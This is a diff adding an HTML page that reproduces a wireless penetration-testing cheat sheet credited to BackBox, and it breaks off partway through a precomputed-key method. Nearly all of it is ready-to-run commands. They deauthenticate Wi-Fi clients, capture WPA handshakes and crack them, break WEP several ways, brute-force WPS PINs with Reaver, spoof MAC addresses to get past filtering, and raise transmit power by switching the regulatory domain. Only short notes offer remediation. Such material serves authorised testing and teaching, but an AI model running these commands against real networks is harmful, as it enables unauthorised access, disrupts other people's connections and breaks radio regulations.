@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Wirelesstesting - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "WPA/WPA2 PSK attack with aircrack-ng suite.", url: "#_top", children: [
+          ]},
+          {title: "ifconfig wlan0 down", url: "#ifconfig-wlan0-down", children: [
+          ]},
+          {title: "iw reg set BO", url: "#iw-reg-set-bo", children: [
+          ]},
+          {title: "iwconfig wlan0 txpower 0", url: "#iwconfig-wlan0-txpower-0", children: [
+          ]},
+          {title: "ifconfig wlan0 up", url: "#ifconfig-wlan0-up", children: [
+          ]},
+          {title: "airmon-ng start wlan0", url: "#airmon-ng-start-wlan0", children: [
+          ]},
+          {title: "airodump-ng --write capture mon0", url: "#airodump-ng-write-capture-mon0", children: [
+              {title: "WIRELESS ANTENNA", url: "#wireless-antenna" },
+          ]},
+          {title: "What\u2019s my mac?", url: "#whats-my-mac", children: [
+          ]},
+          {title: "What\u2019s my mac?", url: "#whats-my-mac_1", children: [
+          ]},
+          {title: "What\u2019s my mac?", url: "#whats-my-mac_2", children: [
+          ]},
+          {title: "What\u2019s my mac?", url: "#whats-my-mac_3", children: [
+              {title: "BYPASS MAC FILTERING", url: "#bypass-mac-filtering" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <p>all credits to <a href="@backbox.com">@backbox.com</a> for the following section (found below) original work found <a href="https://backbox.com/2014/05/12/wireless-penetration-testing-cheat-sheet/">here</a></p>
+<h2 id="wpawpa2-psk-attack-with-aircrack-ng-suite">WPA/WPA2 PSK attack with aircrack-ng suite.</h2>
+<p>Place your wireless card into Monitor Mode
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>ifconfig wlan0 #Check wireless IFace
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>sudo airmon-ng check kill  #kill issue causing processes
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>sudo airmon-ng start wlan0 #start monitor mode
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>sudo airodump-ng wlan0mon  #start capturing
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>sudo airodump-ng --bssid 64:66:B3:6E:B0:8A -c 11 wlan0mon -w output
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>sudo aireplay-ng --deauth 5 -a 64:66:B3:6E:B0:8A wlan0mon   #deauthenticate the client
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>sudo aircrack-ng output-01.cap dict #crack the passphrase
+</span></code></pre></div>
+Detect all available wireless AP’s and clients
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>airodump-ng mon0
+</span></code></pre></div>
+Setting adapter channel
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>iwconfig mon0 channel &lt;channel_number&gt;
+</span></code></pre></div>
+Capturing the four-way handshake
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>airodump-ng --channel &lt;channel_number&gt; --bssid &lt;bssid&gt; --write capture mon0
+</span></code></pre></div>
+You can capture the handshake passively (it takes time) or de-authenticate a client.</p>
+<p>De-authentication attack
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>aireplay-ng --deauth 3 -a &lt;BSSID&gt; -c &lt;client_mac&gt; mon0
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>Deauth every client - aireplay-ng -0 5 -a &lt;bssid&gt; mon0
+</span></code></pre></div>
+Dictionary Attack
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>aircrack-ng -w passwords.lst capture-01.cap
+</span></code></pre></div>
+Brute force Attack
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>crunch 8 8 0123456789 | aircrack-ng -e &quot;Name of Wireless Network&quot; -w - /root/home/wpa2.eapol.cap
+</span></code></pre></div>
+WEP attack with aircrack-ng suite.</p>
+<hr />
+<p>Place your wireless card into Monitor Mode
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>airmon-ng start wlan0
+</span></code></pre></div>
+Detect all available wireless AP’s and clients
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>airodump-ng mon0
+</span></code></pre></div>
+Setting adapter channel
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>iwconfig mon0 channel &lt;channel_number&gt;
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>airodump-ng -c (channel) -w (file name) --bssid (bssid) (interface)
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>aireplay-ng -1 0 -a (bssid) -h 00:11:22:33:44:55 -e (essid) (interface)
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>aireplay-ng -3 -b (bssid) -h 00:11:22:33:44:55 (interface)
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>aircrack-ng -b (bssid) (file name-01.cap)
+</span></code></pre></div>
+Rogue Access Point Testing</p>
+<hr />
+<h1 id="ifconfig-wlan0-down">ifconfig wlan0 down</h1>
+<h1 id="iw-reg-set-bo">iw reg set BO</h1>
+<h1 id="iwconfig-wlan0-txpower-0">iwconfig wlan0 txpower 0</h1>
+<h1 id="ifconfig-wlan0-up">ifconfig wlan0 up</h1>
+<h1 id="airmon-ng-start-wlan0">airmon-ng start wlan0</h1>
+<h1 id="airodump-ng-write-capture-mon0">airodump-ng --write capture mon0</h1>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>root@backbox:/home/backbox# ifconfig wlan0 down
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>root@backbox:/home/backbox# iw reg set BO
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>root@backbox:/home/backbox# ifconfig wlan0 up
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>root@backbox:/home/backbox# iwconfig wlan0 channel 13
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>root@backbox:/home/backbox# iwconfig wlan0 txpower 30
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>root@backbox:/home/backbox# iwconfig wlan0 rate 11M auto
+</span></code></pre></div>
+Reaver</p>
+<hr />
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>airmon-ng start wlan0
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>airodump-ng wlan0
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -vv
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -S --no-nacks -d7 -vv -c 1
+</span></code></pre></div>
+Pixie WPS</p>
+<hr />
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>airmon-ng check
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>airmon-ng start wlan0
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>airodump-ng wlan0mon --wps
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>reaver -i wlan0mon -c 11 -b 00:00:00:00:00:00 -K 1
+</span></code></pre></div>
+Wireless Notes</p>
+<hr />
+<p>Wired Equivalent Privacy (WEP)
+RC4 stream cipher w/ CRC32 for integrity check
+- Attack: 
+By sniffing an ARP packet, then replaying it to get many encrypted replies with different IVs.
+- Remediation: 
+Use WPA2</p>
+<p>Wifi Protected Access (WPA)
+Temporal Key Integrity Protocol (TKIP) Message Integrity Check
+- Attack: 
+Uses a four way handshake, and if that handshake can be captured, then a dictionary attack ban be mounted to find the Pairwise Master Key for the Access Point and client Station.
+- Remediation: 
+Use long-keys</p>
+<p>Wifi Protected Access 2 (WPA2)
+Advanced Encryption Standard (AES)
+- Attack: 
+Uses a four way handshake, and if that handshake can be captured, then a dictionary attack ban be mounted to find the Pairwise Master Key for the Access Point and client Station.
+- Remediation:
+WPA-Enterprise</p>
+<h2 id="wireless-antenna">WIRELESS ANTENNA</h2>
+<p>Open the Monitor Mode
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>root@backbox:~# ifconfig wlan0mon down
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>root@backbox:~# iwconfig wlan0mon mode monitor
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>root@backbox:~# ifconfig wlan0mon up
+</span></code></pre></div>
+Increase Wi-Fi TX Power
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>root@backbox:~# iw reg set B0
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>root@backbox:~# iwconfig wlan0 txpower &lt;NmW|NdBm|off|auto&gt;
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>#txpower is 30 (generally)
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>#txpower is depends your country, please googling
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>root@backbox:~# iwconfig
+</span></code></pre></div>
+Change WiFi Channel
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>root@backbox:~# iwconfig wlan0 channel &lt;SetChannel(1-14)&gt;
+</span></code></pre></div>
+WEP CRACKING</p>
+<hr />
+<p>Method 1 : Fake Authentication Attack
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>root@backbox:~# airmon-ng start wlan0
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>root@backbox:~# airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;BSSID&gt; -w &lt;FileName&gt; wlan0mon
+</span></code></pre></div></p>
+<h1 id="whats-my-mac">What’s my mac?</h1>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>root@backbox:~# macchanger --show wlan0mon
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>root@backbox:~# aireplay-ng -1 0 -a &lt;BSSID&gt; -h &lt;OurMac&gt; -e &lt;ESSID&gt; wlan0mon
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>root@backbox:~# aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b &lt;BSSID&gt; -h &lt;OurMac&gt; wlan0mon
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>root@backbox:~# aircrack-ng -b &lt;BSSID&gt; &lt;PCAP_of_FileName&gt;
+</span></code></pre></div>
+Method 2 : ARP Replay Attack
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>root@backbox:~# airmon-ng start wlan0
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>root@backbox:~# airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;BSSID&gt; -w &lt;FileName&gt; wlan0mon
+</span></code></pre></div></p>
+<h1 id="whats-my-mac_1">What’s my mac?</h1>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>root@backbox:~# macchanger --show wlan0mon
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>root@backbox:~# aireplay-ng -3 -x 1000 -n 1000 -b &lt;BSSID&gt; -h &lt;OurMac&gt; wlan0mon
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>root@backbox:~# aircrack-ng -b &lt;BSSID&gt; &lt;PCAP_of_FileName&gt;
+</span></code></pre></div>
+Method 3 : Chop Chop Attack
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>root@backbox:~# airmon-ng start wlan0
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>root@backbox:~# airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;BSSID&gt; -w &lt;FileName&gt; wlan0mon
+</span></code></pre></div></p>
+<h1 id="whats-my-mac_2">What’s my mac?</h1>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>root@backbox:~# macchanger --show wlan0mon
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>root@backbox:~# aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;BSSID&gt; -h &lt;OurMac&gt; wlan0mon
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>root@backbox:~# aireplay-ng -4 -b &lt;BSSID&gt; -h &lt;OurMac&gt; wlan0mon
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a> #Press ‘y’ ;
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>root@backbox:~# packetforge-ng -0 -a &lt;BSSID&gt; -h &lt;OurMac&gt; -k &lt;SourceIP&gt; -l &lt;DestinationIP&gt; -y &lt;XOR_PacketFile&gt; -w &lt;FileName2&gt;
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>root@backbox:~# aireplay-ng -2 -r &lt;FileName2&gt; wlan0mon
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>root@backbox:~# aircrack-ng &lt;PCAP_of_FileName&gt;
+</span></code></pre></div>
+Method 4 : Fragmentation Attack
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>root@backbox:~# airmon-ng start wlan0
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>root@backbox:~# airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;BSSID&gt; -w &lt;FileName&gt; wlan0mon
+</span></code></pre></div></p>
+<h1 id="whats-my-mac_3">What’s my mac?</h1>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>root@backbox:~# macchanger --show wlan0mon
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>root@backbox:~# aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;BSSID&gt; -h &lt;OurMac&gt; wlan0mon
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>root@backbox:~# aireplay-ng -5 -b &lt;BSSID&gt; -h &lt; OurMac &gt; wlan0mon
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>#Press &#39;y&#39; ;
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>root@backbox:~# packetforge-ng -0 -a &lt;BSSID&gt; -h &lt; OurMac &gt; -k &lt;SourceIP&gt; -l &lt;DestinationIP&gt; -y &lt;XOR_PacketFile&gt; -w &lt;FileName2&gt;
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>root@backbox:~# aireplay-ng -2 -r &lt;FileName2&gt; wlan0mon
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>root@backbox:~# aircrack-ng &lt;PCAP_of_FileName&gt;
+</span></code></pre></div>
+Method 5 : SKA (Shared Key Authentication) Type Cracking
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>root@backbox:~# airmon-ng start wlan0
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>root@backbox:~# airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;BSSID&gt; -w &lt;FileName&gt; wlan0mon
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>root@backbox:~# aireplay-ng -0 10 -a &lt;BSSID&gt; -c &lt;VictimMac&gt; wlan0mon
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>root@backbox:~# ifconfig wlan0mon down
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>root@backbox:~# macchanger --mac &lt;VictimMac&gt; wlan0mon
+</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>root@backbox:~# ifconfig wlan0mon up
+</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>root@backbox:~# aireplay-ng -3 -b &lt;BSSID&gt; -h &lt;FakedMac&gt; wlan0mon
+</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>root@backbox:~# aireplay-ng --deauth 1 -a &lt;BSSID&gt; -h &lt;FakedMac&gt; wlan0mon
+</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>root@backbox:~# aircrack-ng &lt;PCAP_of_FileName&gt;
+</span></code></pre></div>
+WPA / WPA2 CRACKING</p>
+<hr />
+<p>Method 1 : WPS Attack
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>root@backbox:~# airmon-ng start wlan0
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>root@backbox:~# apt-get install reaver
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>root@backbox:~# wash -i wlan0mon -C
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>root@backbox:~# reaver -i wlan0mon -b &lt;BSSID&gt; -vv -S
+</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>#or, Specific attack
+</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>root@backbox:~# reaver -i -c &lt;Channel&gt; -b &lt;BSSID&gt; -p &lt;PinCode&gt; -vv -S
+</span></code></pre></div>
+Method 2 : Dictionary Attack
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>root@backbox:~# airmon-ng start wlan0
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>root@backbox:~# airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;BSSID&gt; -w &lt;FileName&gt; wlan0mon
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>root@backbox:~# aireplay-ng -0 1 -a &lt;BSSID&gt; -c &lt;VictimMac&gt; wlan0mon
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>root@backbox:~# aircrack-ng -w &lt;WordlistFile&gt; -b &lt;BSSID&gt; &lt;Handshaked_PCAP&gt;
+</span></code></pre></div>
+Method 3 : Crack with John The Ripper
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>root@backbox:~# airmon-ng start wlan0
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>root@backbox:~# airodump-ng -c &lt;Channel&gt; --bssid &lt;BSSID&gt; -w &lt;FileName&gt; wlan0mon
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>root@backbox:~# aireplay-ng -0 1 -a &lt;BSSID&gt; -c &lt;VictimMac&gt; wlan0mon
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>root@backbox:~# cd /pentest/passwords/john
+</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>root@backbox:~# john -wordlist=&lt;Wordlist&gt; --rules -stdout|aircrack-ng -0 -e &lt;ESSID&gt; -w - &lt;PCAP_of_FileName&gt;
+</span></code></pre></div>
+Method 4 : Crack with coWPAtty
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>root@backbox:~# airmon-ng start wlan0
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>root@backbox:~# airodump-ng -c &lt;Channel&gt; --bssid &lt;BSSID&gt; -w &lt;FileName&gt; wlan0mon
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>root@backbox:~# aireplay-ng -0 1 -a &lt;BSSID&gt; -c &lt;VictimMac&gt; wlan0mon
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>root@backbox:~# cowpatty -r &lt;FileName&gt; -f &lt;Wordlist&gt; -2 -s &lt;SSID&gt;
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>root@backbox:~# genpmk -s &lt;SSID&gt; -f &lt;Wordlist&gt; -d &lt;HashesFileName&gt;
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>root@backbox:~# cowpatty -r &lt;PCAP_of_FileName&gt; -d &lt;HashesFileName&gt; -2 -s &lt;SSID&gt;
+</span></code></pre></div>
+Method 5 : Crack with Pyrit
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>root@backbox:~# airmon-ng start wlan0
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>root@backbox:~# airodump-ng -c &lt;Channel&gt; --bssid &lt;BSSID&gt; -w &lt;FileName&gt; wlan0mon
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>root@backbox:~# aireplay-ng -0 1 -a &lt;BSSID&gt; -c &lt;VictimMac&gt; wlan0mon
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>root@backbox:~# pyrit -r&lt;PCAP_of_FileName&gt; -b &lt;BSSID&gt; -i &lt;Wordlist&gt; attack_passthrough
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>root@backbox:~# pyrit -i &lt;Wordlist&gt; import_passwords
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>root@backbox:~# pyrit -e &lt;ESSID&gt; create_essid
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>root@backbox:~# pyrit batch
+</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a>root@backbox:~# pyrit -r &lt;PCAP_of_FileName&gt; attack_db
+</span></code></pre></div>
+Method 6 : Precomputed WPA Keys Database Attack
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>root@backbox:~# airmon-ng start wlan0
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>root@backbox:~# airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;BSSID&gt; -w &lt;FileName&gt; wlan0mon
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>root@backbox:~# aireplay-ng -0 1 -a &lt;BSSID&gt; -c &lt;VictimMac&gt; wlan0mon
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>root@backbox:~# kwrite ESSID.txt
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>root@backbox:~# airolib-ng NEW_DB --import essid ESSID.txt
